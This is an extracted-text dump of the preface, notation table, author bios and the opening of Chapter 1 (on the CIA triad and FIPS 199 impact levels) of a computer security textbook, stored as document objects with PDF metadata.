       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 15, 'page_label': '14'}, page_content='IAS Knowledge Units Topics Textbook Coverage\\nFoundational Concepts \\nin Security (Tier 1)\\n• CIA (Confidentiality, Integrity, and \\nAvailability)\\n• Risk, threats, vulnerabilities, and attack \\nvectors\\n• Authentication and authorization, access \\ncontrol (mandatory vs. discretionary)\\n• Trust and trustworthiness\\n• Ethics (responsible disclosure)\\n1—Overview\\n3—User Authentication\\n4—Access Control\\n19—Legal and Ethical Aspects\\nPrinciples of Secure \\nDesign (Tier 1)\\n• Least privilege and isolation\\n• Fail-safe defaults\\n• Open design\\n• End-to-end security\\n• Defense in depth\\n• Security by design\\n• Tensions between security and other design \\ngoals\\n1—Overview\\nPrinciples of Secure \\nDesign (Tier 2)\\n• Complete mediation\\n• Use of vetted security components\\n• Economy of mechanism (reducing trusted \\ncomputing base, minimize attack surface)\\n• Usable security\\n• Security composability\\n• Prevention, detection, and deterrence\\n1—Overview\\nDefensive Programming \\n(Tier 1)\\n• Input validation and data sanitization\\n• Choice of programming language and \\n type-safe languages\\n• Examples of input validation and data \\n sanitization errors (buffer overflows, integer \\nerrors, SQL injection, and XSS vulnerability)\\n• Race conditions\\n• Correct handling of exceptions and \\n unexpected behaviors\\n11—Software Security\\nDefensive Programming \\n(Tier 2)\\n• Correct usage of third-party components\\n• Effectively deploying security updates\\n11—Software Security\\n12—OS Security\\nThreats and Attacks \\n(Tier 2)\\n• Attacker goals, capabilities, and motivations\\n• Malware\\n• Denial of service and distributed denial of \\nservice\\n• Social engineering\\n6—Malicious Software\\n7—Denial-of-Service Attacks\\nNetwork Security  \\n(Tier 2)\\n• Network-specific threats and attack types\\n• Use of cryptography for data and network \\nsecurity\\n• Architectures for secure networks\\n• Defense mechanisms and countermeasures\\n• Security for wireless, cellular networks\\n8—Intrusion Detection\\n9—Firewalls and Intrusion \\n Prevention Systems\\nPart 5—Network Security\\nCryptography (Tier 2) • Basic cryptography terminology\\n• Cipher types\\n• Overview of mathematical preliminaries\\n• Public key infrastructure\\n2—Cryptographic Tools\\nPart 4—Cryptographic \\nAlgorithms\\nTable P.1 Coverage of CS2013 Information Assurance and Security (IAS) Knowledge Area\\n14  PREFACE\\nA01_STAL0611_04_GE_FM.indd   14 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 16, 'page_label': '15'}, page_content='the recommendations of the ACM/IEEE Computer Science Curricula 2013 (CS2013). The \\nCS2013 curriculum recommendation includes, for the first time, Information Assurance and \\nSecurity (IAS) as one of the Knowledge Areas in the Computer Science Body of  Knowledge. \\nCS2013 divides all course work into three categories: Core-Tier 1 (all topics should be \\nincluded in the curriculum), Core-Tier 2 (all or almost all topics should be included), and \\nElective (desirable to provide breadth and depth). In the IAS area, CS2013 includes three \\nTier 1 topics, five Tier 2 topics, and numerous Elective topics, each of which has a number of \\nsubtopics. This text covers all of the Tier 1 and Tier 2 topics and subtopics listed by CS2013, \\nas well as many of the elective topics. Table P .1 shows the support for the ISA Knowledge \\nArea provided in this textbook.\\nCOVERAGE OF CISSP SUBJECT AREAS\\nThis book provides coverage of all the subject areas specified for CISSP (Certified  Information \\nSystems Security Professional) certification. The CISSP designation from the International \\nInformation Systems Security Certification Consortium (ISC)2 is often referred to as the \\n“gold standard” when it comes to information security certification. It is the only univer -\\nsally recognized certification in the security industry. Many organizations, including the U.S. \\nDepartment of Defense and many financial institutions, now require that cyber security per-\\nsonnel have the CISSP certification. In 2004, CISSP became the first IT program to earn \\naccreditation under the international standard ISO/IEC 17024 ( General Requirements for \\nBodies Operating Certification of Persons).\\nThe CISSP examination is based on the Common Body of Knowledge (CBK), a compen-\\ndium of information security best practices developed and maintained by (ISC)2, a nonprofit \\norganization. The CBK is made up of 8 domains that comprise the body of knowledge that is \\nrequired for CISSP certification.\\nThe 8 domains are as follows, with an indication of where the topics are covered in this \\ntextbook:\\n• Security and risk management:  Confidentiality , integrity, and availability concepts; \\n security governance principles; risk management;  compliance; legal and regulatory \\nissues; professional ethics; and security policies, standards, procedures, and guidelines. \\n(Chapter 14)\\n• Asset security: Information and asset classification; ownership (e.g. data owners, system \\nowners); privacy protection; appropriate retention; data security controls; and handling \\nrequirements (e.g., markings, labels, storage). (Chapters 5, 15, 16, 19)\\n• Security engineering:  Engineering pr ocesses using secure design principles; security \\nmodels; security evaluation models; security capabilities of information systems; security \\narchitectures, designs, and solution elements vulnerabilities; web-based systems vulner-\\nabilities; mobile systems vulnerabilities; embedded devices and cyber-physical systems \\nvulnerabilities; cryptography; and site and facility design secure principles; physical secu-\\nrity. (Chapters 1, 2, 13, 15, 16)\\n• Communication and network security: Secure network architecture design (e.g., IP and \\nnon-IP protocols, segmentation); secure network components; secure communication \\nchannels; and network attacks. (Part Five)\\nPREFACE  15\\nA01_STAL0611_04_GE_FM.indd   15 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 17, 'page_label': '16'}, page_content='• Identity and access management: Physical and logical assets control; identification and \\nauthentication of people and devices; identity as a service (e.g. cloud identity); third-\\nparty identity services (e.g., on-premise); access control attacks; and identity and access \\nprovisioning lifecycle (e.g., provisioning review). (Chapters 3, 4, 8, 9)\\n• Security assessment and te sting: Assessment and test strategies; security process data \\n(e.g., management and operational controls); security control testing; test outputs \\n(e.g., automated, manual); and security architectures vulnerabilities. (Chapters 14, \\n15, 18)\\n• Security operations: Investigations support and requirements; logging and monitoring \\nactivities; provisioning of resources; foundational security operations concepts; resource \\nprotection techniques; incident management; preventative measures; patch and vulner-\\nability management; change management processes; recovery strategies; disaster recov-\\nery processes and plans; business continuity planning and exercises; physical security; \\nand personnel safety concerns. (Chapters 11, 12, 15, 16, 17)\\n• Software development security: Security in the software development lifecycle; devel-\\nopment environment security controls; software security effectiveness; and acquired \\nsoftware security impact. (Part Two)\\nSUPPORT FOR NSA/DHS CERTIFICATION\\nThe U.S. National Security Agency (NSA) and the U.S. Department of Homeland Security \\n(DHS) jointly sponsor the National Centers of Academic Excellence in Information Assur-\\nance/Cyber Defense (IA/CD). The goal of these programs is to reduce vulnerability in our \\nnational information infrastructure by promoting higher education and research in IA and \\nproducing a growing number of professionals with IA expertise in various disciplines. To \\nachieve that purpose, NSA/DHS have defined a set of Knowledge Units for 2- and 4-year \\ninstitutions that must be supported in the curriculum to gain a designation as a NSA/DHS \\nNational Center of Academic Excellence in IA/CD. Each Knowledge Unit is composed \\nof a minimum list of required topics to be covered and one or more outcomes or learning \\nobjectives. Designation is based on meeting a certain threshold number of core and optional \\nKnowledge Units.\\nIn the area of computer security, the 2014 Knowledge Units document lists the following \\ncore Knowledge Units:\\n• Cyber Defense: Includes access control, cryptography, firewalls, intrusion detection sys-\\ntems, malicious activity detection and countermeasures, trust relationships, and defense \\nin depth.\\n• Cyber Threats: Includes types of attacks, legal issues, attack surfaces, attack trees, insider \\nproblems, and threat information sources.\\n• Fundamental Security Design Principles: A list of 12 principles, all of which are covered \\nin Section 1.4 of this text.\\n• Information Assurance F undamentals: Includes threats and vulnerabilities, intrusion \\ndetection and prevention systems, cryptography, access control models, identification/\\nauthentication, and audit.\\n16  PREFACE\\nA01_STAL0611_04_GE_FM.indd   16 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 18, 'page_label': '17'}, page_content='• Introduction to Cryptography:  Includes symmetric cryptography, public-key \\n cryptography, hash functions, and digital signatures.\\n• Databases: Includes an overview of databases, database access controls, and security \\nissues of inference.\\nThis book provides extensive coverage in all of these areas. In addition, the book \\n partially covers a number of the optional Knowledge Units.\\nPLAN OF THE TEXT\\nThe book is divided into five parts (see Chapter 0):\\n• Computer Security Technology and Principles\\n• Software and System Security\\n• Management Issues\\n• Cryptographic Algorithms\\n• Network Security\\nThe text is also accompanied by a number of online chapters and appendices that pro-\\nvide more detail on selected topics.\\nThe text includes an extensive glossary, a list of frequently used acronyms, and a bib -\\nliography. Each chapter includes homework problems, review questions, a list of key words, \\nand suggestions for further reading.\\nINSTRUCTOR SUPPORT MATERIALS\\nThe major goal of this text is to make it as effective a teaching tool for this exciting and fast- moving \\nsubject as possible. This goal is reflected both in the structure of the book and in the supporting \\nmaterial. The text is accompanied by the following supplementary material to aid the instructor:\\n• Projects manual: Project resources including documents and portable software, plus sug-\\ngested project assignments for all of the project categories listed in the following section.\\n• Solutions manual: Solutions to end-of-chapter Review Questions and Problems.\\n• PowerPoint slides: A set of slides covering all chapters, suitable for use in lecturing.\\n• PDF files: Reproductions of all figures and tables from the book.\\n• Test bank: A chapter-by-chapter set of questions.\\n• Sample syllabuses: The text contains more material than can be conveniently covered \\nin one semester. Accordingly, instructors are provided with several sample syllabuses \\nthat guide the use of the text within limited time. These samples are based on real-world \\nexperience by professors with the first edition.\\nAll of these support materials are available at the Instructor Resource Center (IRC) for \\nthis textbook, which can be reached through the publisher’s Website www.pearsonglobaleditions \\n.com/stallings . To gain access to the IRC, please contact your local Pearson sales representative.\\nPREFACE  17\\nA01_STAL0611_04_GE_FM.indd   17 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 19, 'page_label': '18'}, page_content='The Companion Website includes the following:\\n• Links to Web sites for other courses being taught using this book.\\n• Sign-up information for an Internet mailing list for instructors using this book to \\nexchange information, suggestions, and questions with each other and with the author.\\nSTUDENT RESOURCES\\nFor this new edition, a tremendous amount of original support -\\ning material for students has been made available online, at \\ntwo Web locations. The Companion Website ,  includes a list of \\nrelevant links organized by chapter and an errata sheet for the \\nbook.\\nPurchasing this textbook now grants the reader 12 months of \\naccess to the Premium Content Site, which includes the following \\nmaterials:\\n•  Online chapters:  To limit the size and cost of the book, three \\n chapters of the book are provided in PDF format. The chapters \\nare listed in this book’s table of contents.\\n• Online appendices: There are numerous interesting topics that support material found in \\nthe text but whose inclusion is not warranted in the printed text. A total of eleven online \\nappendices cover these topics for the interested student. The appendices are listed in \\nthis book’s table of contents.\\n• Homework problems and solutions: To aid the student in understanding the material, \\na separate set of homework problems with solutions is available. These enable the stu-\\ndents to test their understanding of the text.\\nTo access the Premium Content site, click on the link at www.pearsonglobaleditions  \\n.com/stallings and enter the student access code found on the inside front cover.\\nPROJECTS AND OTHER STUDENT EXERCISES\\nFor many instructors, an important component of a computer security course is a project or \\nset of projects by which the student gets hands-on experience to reinforce concepts from the \\ntext. This book provides an unparalleled degree of support for including a projects component \\nin the course. The instructor’s support materials available through Pearson not only include \\nguidance on how to assign and structure the projects but also include a set of user manuals for \\nvarious project types plus specific assignments, all written especially for this book. Instructors \\ncan assign work in the following areas:\\n• Hacking exercises: Two projects that enable students to gain an understanding of the \\nissues in intrusion detection and prevention.\\n• Laboratory exercises: A series of projects that involve programming and experimenting \\nwith concepts from the book.\\n18  PREFACE\\nA01_STAL0611_04_GE_FM.indd   18 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 20, 'page_label': '19'}, page_content='• Security education (SEED) projects: The SEED projects are a set of hands-on exercises, \\nor labs, covering a wide range of security topics.\\n• Research projects: A series of research assignments that instruct the students to research \\na particular topic on the Internet and write a report.\\n• Programming projects: A series of programming projects that cover a broad range of \\ntopics and that can be implemented in any suitable language on any platform.\\n• Practical security assessments: A set of exercises to examine current infrastructure and \\npractices of an existing organization.\\n• Firewall projects:  A portable network firewall visualization simulator is provided, \\ntogether with exercises for teaching the fundamentals of firewalls.\\n• Case studies: A set of real-world case studies, including learning objectives, case descrip-\\ntion, and a series of case discussion questions.\\n• Reading/report assignments: A list of papers that can be assigned for reading and writing \\na report, plus suggested assignment wording.\\n• Writing assignments: A list of writing assignments to facilitate learning the material.\\n• Webcasts for teaching computer security:  A catalog of webcast sites that can be used \\nto enhance the course. An effective way of using this catalog is to select, or allow the \\nstudent to select, one or a few videos to watch, and then to write a report/analysis of \\nthe video.\\nThis diverse set of projects and other student exercises enables the instructor to use the \\nbook as one component in a rich and varied learning experience and to tailor a course plan to \\nmeet the specific needs of the instructor and students. See Appendix A in this book for details.\\nACKNOWLEDGMENTS\\nThis new edition has benefited from review by a number of people, who gave generously of \\ntheir time and expertise. The following professors and instructors reviewed all or a large part \\nof the manuscript: Bernardo Palazzi (Brown University), Jean Mayo (Michigan Technological \\nUniversity), Scott Kerlin (University of North Dakota), Philip Campbell (Ohio University), \\nScott Burgess (Humboldt State University), Stanley Wine (Hunter College/CUNY), and  \\nE. Mauricio Angee (Florida International University).\\nThanks also to the many people who provided detailed technical reviews of one or \\nmore chapters: Umair Manzoor (UmZ), Adewumi Olatunji (FAGOSI Systems, Nigeria), Rob \\n Meijer, Robin Goodchil, Greg Barnes (Inviolate Security LLC), Arturo Busleiman (Buanzo \\nConsulting), Ryan M. Speers (Dartmouth College), Wynand van Staden (School of  Computing, \\nUniversity of South Africa), Oh Sieng Chye, Michael Gromek, Samuel Weisberger, Brian \\nSmithson (Ricoh Americas Corp, CISSP), Josef B. Weiss (CISSP), Robbert-Frank Ludwig \\n(Veenendaal, ActStamp Information Security), William Perry, Daniela Zamfiroiu (CISSP), \\nRodrigo Ristow Branco, George Chetcuti (Technical Editor, TechGenix), Thomas Johnson \\n(Director of Information Security at a banking holding company in Chicago, CISSP), Robert \\nYanus (CISSP), Rajiv Dasmohapatra (Wipro Ltd), Dirk Kotze, Ya’akov Yehudi, and  Stanley \\nWine (Adjunct Lecturer, Computer Information Systems Department, Zicklin School of \\n Business, Baruch College).\\nPREFACE  19\\nA01_STAL0611_04_GE_FM.indd   19 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 21, 'page_label': '20'}, page_content='Dr. Lawrie Brown would first like to thank Bill Stallings for the pleasure of working with \\nhim to produce this text. I would also like to thank my colleagues in the School of Engineering \\nand Information Technology, UNSW Canberra at the Australian Defence Force Academy for \\ntheir encouragement and support. In particular, thanks to Gideon Creech, Edward Lewis, and \\nBen Whitham for discussion and review of some of the chapter content.\\nFinally, we would like to thank the many people responsible for the publication of the \\nbook, all of whom did their usual excellent job. This includes the staff at Pearson, particularly \\nour editor Tracy Dunkelberger, her editorial assistant Kristy Alaura, and project manager Bob \\nEngelhardt. Thanks also to the marketing and sales staffs at Pearson, without whose efforts \\nthis book would not be in front of you.\\nACKNOWLEDGMENTS FOR THE GLOBAL EDITION\\nPearson would like to thank and acknowledge Somitra Sanadhya (Indian Institute of Technol-\\nogy Ropar) for contributing to the Global Edition, and Arup Bhattacharya (RCC Institute of \\nTechnology), A. Kannammal (Coimbatore Institute of Technology), and Khyat Sharma for \\nreviewing the Global Edition.\\n20  PREFACE\\nA01_STAL0611_04_GE_FM.indd   20 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 22, 'page_label': '21'}, page_content='21\\nnotation\\nSymbol Expression Meaning\\nD, K D(K, Y) Symmetric decryption of ciphertext Y using secret key K\\nD, PRa D(PRa, Y) Asymmetric decryption of ciphertext Y using A’s private key PRa\\nD, PUa D(PUa, Y) Asymmetric decryption of ciphertext Y using A’s public key PUa\\nE, K E(K, X) Symmetric encryption of plaintext X using secret key K\\nE, PRa E(PRa, X) Asymmetric encryption of plaintext X using A’s private key PRa\\nE, PUa E(PUa, X) Asymmetric encryption of plaintext X using A’s public key PUa\\nK Secret key\\nPRa Private key of user A\\nPUa Public key of user A\\nH H(X) Hash function of message X\\n+ x + y Logical OR: x OR y\\n• x•y Logical AND: x AND y\\n/uni223C.alt /uni223C.altx Logical NOT: NOT x\\nC A characteristic formula, consisting of a logical formula over the \\n values of attributes in a database\\nX X(C) Query set of C, the set of records satisfying C\\n/H20841, X /H20841X(C)/H20841 Magnitude of X(C): the number of records in X(C)\\nx X(C) x X(D) Set intersection: the number of records in both X(C) and X(D)\\n/H20841 /H20841x/H20841 /H20841y x concatenated with y\\nA01_STAL0611_04_GE_FM.indd   21 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 23, 'page_label': '22'}, page_content='22\\nAbout the Authors\\nDr. William Stallings authored 18 textbooks, and, counting revised \\neditions, a total of 70 books on various aspects of these sub -\\njects. His writings have appeared in numerous ACM and IEEE \\npublications, including the Proceedings of the IEEE and ACM \\n Computing Reviews. He has 13\\xa0times received the award for the \\nbest Computer Science textbook of the year from the Text and \\nAcademic Authors Association.\\nIn over 30 years in the field, he has been a technical \\n contributor, technical manager, and an executive with several \\nhigh-technology firms. He has designed and implemented both \\nTCP/IP-based and OSI-based protocol suites on a variety of computers and operating  systems, \\nranging from microcomputers to mainframes. Currently he is an independent consultant \\nwhose clients have included computer and networking manufacturers and customers, software \\ndevelopment firms, and leading-edge government research institutions.\\nHe created and maintains the Computer Science Student Resource Site at Computer \\nScienceStudent.com. This site provides documents and links on a variety of subjects of general \\ninterest to computer science students (and professionals). He is a member of the editorial \\nboard of Cryptologia, a scholarly journal devoted to all aspects of cryptology. \\nDr. Lawrie Brown is a visiting senior lecturer in the School of \\nEngineering and Information Technology, UNSW Canberra at \\nthe Australian Defence Force Academy.\\nHis professional interests include communications and \\n computer systems security and cryptography, including research \\non pseudo-anonymous communication, authentication,  security \\nand trust issues in Web environments, the design of secure remote \\ncode execution environments using the functional  language \\nErlang, and on the design and implementation of the LOKI \\n family of block ciphers.\\nDuring his career, he has presented courses on cryptography, cybersecurity, data \\n communications, data structures, and programming in Java to both undergraduate and \\n postgraduate students.\\nA01_STAL0611_04_GE_FM.indd   22 10/12/17   8:43 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 24, 'page_label': '23'}, page_content='23\\n1.1 Computer Security Concepts\\nA Definition of Computer Security\\nExamples\\nThe Challenges of Computer Security\\nA Model for Computer Security\\n1.2 Threats, Attacks, and Assets\\nThreats and Attacks\\nThreats and Assets\\n1.3 Security Functional Requirements\\n1.4 Fundamental Security Design Principles\\n1.5 Attack Surfaces and Attack Trees\\nAttack Surfaces\\nAttack Trees\\n1.6 Computer Security Strategy\\nSecurity Policy\\nSecurity Implementation\\nAssurance and Evaluation\\n1.7 Standards\\n1.8 Key Terms, Review Questions, and Problems\\nOverview\\nCHAPTER\\n \\nM01_STAL0611_04_GE_C01.indd   23 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 25, 'page_label': '24'}, page_content='24  CHAPTER 1 / OvERviEw\\nThis chapter provides an overview of computer security. We begin with a discussion \\nof what we mean by computer security. In essence, computer security deals with \\n computer-related assets that are subject to a variety of threats and for which  various \\nmeasures are taken to protect those assets. Accordingly, the next section of this \\n chapter provides a brief overview of the categories of computer -related assets that \\nusers and system managers wish to preserve and protect, and a look at the  various \\nthreats and attacks that can be made on those assets. Then, we survey the measures \\nthat can be taken to deal with such threats and attacks. This we do from three dif -\\nferent viewpoints, in Sections 1.3 through 1.5. We then lay out in general terms a \\ncomputer security strategy.\\nThe focus of this chapter, and indeed this book, is on three fundamental \\nquestions:\\n1. What assets do we need to protect?\\n2. How are those assets threatened?\\n3. What can we do to counter those threats?\\n 1.1 COMPUTER SECURITY CONCEPTS\\nA Definition of Computer Security\\nThe NIST Internal/Interagency Report NISTIR 7298 (Glossary of Key Information \\nSecurity Terms, May 2013) defines the term computer security as follows:\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Describe the key security requirements of confidentiality, integrity, and \\navailability.\\n ◆ Discuss the types of security threats and attacks that must be dealt with \\nand give examples of the types of threats and attacks that apply to different \\n categories of computer and network assets.\\n ◆ Summarize the functional requirements for computer security.\\n ◆ Explain the fundamental security design principles.\\n ◆ Discuss the use of attack surfaces and attack trees.\\n ◆ Understand the principle aspects of a comprehensive security strategy.\\nComputer Security: Measures and controls that ensure confidentiality, integrity, \\nand availability of information system assets including hardware, software, firm-\\nware, and information being processed, stored, and communicated.\\nM01_STAL0611_04_GE_C01.indd   24 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 26, 'page_label': '25'}, page_content='1.1 / COMPUTER SECURiTY CONCEPTS  25\\nThis definition introduces three key objectives that are at the heart of computer \\nsecurity:\\n• Confidentiality: This term covers two related concepts:\\n — Data confidentiality:1 Assures that private or confidential information is \\nnot made available or disclosed to unauthorized individuals.\\n — Privacy: Assures that individuals control or influence what information \\nrelated to them may be collected and stored and by whom and to whom that \\ninformation may be disclosed.\\n• Integrity: This term covers two related concepts:\\n — Data integrity: Assures that information and programs are changed only \\nin a specified and authorized manner.\\n — System integrity: Assures that a system performs its intended function in \\nan unimpaired manner, free from deliberate or inadvertent unauthorized \\nmanipulation of the system.\\n• Availability: Assures that systems work promptly and service is not denied to \\nauthorized users.\\nThese three concepts form what is often referred to as the CIA triad. The three \\nconcepts embody the fundamental security objectives for both data and for information \\nand computing services. For example, the NIST standard FIPS 199 (Standards for Security \\nCategorization of Federal Information and Information Systems, February 2004) lists con-\\nfidentiality, integrity, and availability as the three security objectives for information and \\nfor information systems. FIPS 199 provides a useful characterization of these three objec-\\ntives in terms of requirements and the definition of a loss of security in each category:\\n• Confidentiality: Preserving authorized restrictions on information access and \\ndisclosure, including means for protecting personal privacy and proprietary infor-\\nmation. A loss of confidentiality is the unauthorized disclosure of information.\\n• Integrity: Guarding against improper information modification or destruction, \\nincluding ensuring information nonrepudiation and authenticity. A loss of integ-\\nrity is the unauthorized modification or destruction of information.\\n• Availability: Ensuring timely and reliable access to and use of information. \\nA loss of availability is the disruption of access to or use of information or an \\ninformation system.\\nAlthough the use of the CIA triad to define security objectives is well estab -\\nlished, some in the security field feel that additional concepts are needed to present a \\ncomplete picture (see Figure 1.1). Two of the most commonly mentioned are as follows:\\n• Authenticity: The property of being genuine and being able to be verified and \\ntrusted; confidence in the validity of a transmission, a message, or message \\n1RFC 4949 (Internet Security Glossary, August 2007) defines information as “facts and ideas, which can \\nbe represented (encoded) as various forms of data,” and data as “information in a specific physical rep -\\nresentation, usually a sequence of symbols that have meaning; especially a representation of information \\nthat can be processed or produced by a computer.” Security literature typically does not make much of a \\ndistinction; nor does this book.\\nM01_STAL0611_04_GE_C01.indd   25 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 27, 'page_label': '26'}, page_content='26  CHAPTER 1 / OvERviEw\\noriginator. This means verifying that users are who they say they are and that \\neach input arriving at the system came from a trusted source.\\n• Accountability: The security goal that generates the requirement for actions \\nof an entity to be traced uniquely to that entity. This supports nonrepudiation, \\ndeterrence, fault isolation, intrusion detection and prevention, and after-action \\nrecovery and legal action. Because truly secure systems are not yet an achiev -\\nable goal, we must be able to trace a security breach to a responsible party. \\nSystems must keep records of their activities to permit later forensic analysis \\nto trace security breaches or to aid in transaction disputes.\\nNote that FIPS 199 includes authenticity under integrity.\\nExamples\\nWe now provide some examples of applications that illustrate the requirements just \\nenumerated.2 For these examples, we use three levels of impact on organizations or \\nindividuals should there be a breach of security (i.e., a loss of confidentiality, integrity, \\nor availability). These levels are defined in FIPS 199:\\n• Low: The loss could be expected to have a limited adverse effect on organiza-\\ntional operations, organizational assets, or individuals. A limited adverse effect \\nmeans that, for example, the loss of confidentiality, integrity, or availability \\nmight: (i) cause a degradation in mission capability to an extent and duration \\nthat the organization is able to perform its primary functions, but the effec -\\ntiveness of the functions is noticeably reduced; (ii) result in minor damage to \\norganizational assets; (iii) result in minor financial loss; or (iv) result in minor \\nharm to individuals.\\n2These examples are taken from a security policy document published by the Information Technology \\nSecurity and Privacy Office at Purdue University.\\nFigure 1.1 Essential Network and \\n Computer Security Requirements\\nData\\nand\\nservices\\nAvailability\\nIntegrity\\nAccountability\\nAuthenticity\\nConﬁdentiality\\nM01_STAL0611_04_GE_C01.indd   26 10/10/17   9:22 PM'),\n",
